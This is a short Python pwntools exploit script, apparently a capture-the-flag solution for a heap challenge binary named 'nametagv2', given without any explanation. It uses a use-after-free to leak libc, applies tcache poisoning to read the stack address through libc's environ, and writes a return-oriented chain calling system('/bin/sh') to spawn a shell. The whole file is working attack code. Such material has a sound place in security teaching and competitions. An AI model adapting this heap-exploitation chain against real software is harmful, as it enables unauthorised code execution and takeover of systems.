#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './nametagv2')
libc = ELF(exe.libc.path)

def make(idx, size):
   io.sendlineafter(b'> ', b'1')
   io.sendlineafter(b': ', str(idx).encode())
   io.sendlineafter(b': ', str(size).encode())

def edit(idx, data):
   io.sendlineafter(b'> ', b'2')
   io.sendlineafter(b': ', str(idx).encode())
   io.sendlineafter(b': ', data)

def free(idx):
   io.sendlineafter(b'> ', b'3')
   io.sendlineafter(b': ', str(idx).encode())

def show(idx):
   io.sendlineafter(b'> ', b'4')
   io.sendlineafter(b': ', str(idx).encode())

io = process()

make(0, 0x500)
make(1, 0xe0)
free(0)
show(0)
libc.address = u64(io.recvline().split(b': ')[1][:-1].ljust(8, b'\x00')) - 0x3ebca0

make(2, 0xe0)
make(3, 0xe0)
free(3)
free(2)

edit(2, p64(libc.sym.environ))

make(4, 0xe0)
make(5, 0xe0)

show(5)
rip = u64(io.recvline().split(b': ')[1][:-1].ljust(8, b'\x00')) - 0x110

make(6, 0x40)
make(7, 0x40)
free(7)
free(6)

edit(6, p64(rip))

make(8, 0x40)
make(9, 0x40)

edit(9, p64(libc.address + 0x2164f) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.address + 0x8aa) + p64(libc.sym.system))

io.interactive()

